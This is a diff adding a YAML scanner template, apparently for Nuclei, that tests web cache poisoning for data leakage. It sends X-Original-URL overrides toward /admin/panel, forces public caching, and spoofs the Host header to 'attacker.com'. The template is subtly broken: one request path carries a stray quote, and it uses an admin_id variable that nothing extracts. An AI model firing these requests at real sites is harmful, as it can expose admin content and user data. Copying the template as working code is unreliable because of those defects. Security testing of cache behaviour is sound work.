@@ -1,0 +1,64 @@
+id: custom-2026-exfil-002
+info:
+  name: Cache Poisoning for Data Leakage - HTTP Cache Abuse
+  author: SecurityTeam
+  severity: high
+  description: |
+    Exploits HTTP caching mechanism to leak sensitive data:
+    1. Inject data via Cache-Control header manipulation
+    2. Poison cache with attacker-controlled content
+    3. Extract sensitive data from cache responses
+    4. Bypass authentication via cached responses
+    
+    Detection method:
+    - Analyze Cache-Control headers for misconfiguration
+    - Attempt cache poisoning with X-Original-URL
+    - Test Vary header handling
+    - Check for Set-Cookie in cached responses
+  
+  reference:
+    - https://portswigger.net/research/practical-web-cache-poisoning
+
+requests:
+  - method: GET
+    path: /api/user/profile
+    headers:
+      X-Original-URL: "/admin/panel"
+      Cache-Control: "public, max-age=3600"
+    
+    extractors:
+      - type: regex
+        internal: true
+        name: cache_key
+        regex: 'X-Cache-Key:\s*([a-f0-9]+)'
+
+  - method: GET
+    path: /admin/panel
+    headers:
+      X-Original-URL: "/api/user/profile"
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"user_id"'
+          - '"admin"'
+
+  - method: GET
+    path: /api/data?id={{admin_id}}"
+    headers:
+      Host: "attacker.com"
+    
+    matchers:
+      - type: dsl
+        expressions:
+          # Original content served from cache
+          - 'contains(body, "admin")'
+          - 'header["X-Cache"] == "HIT"'
+        condition: all
+
+tags:
+  - exfiltration
+  - cache-poisoning
+  - information-disclosure
+  - http-smuggling
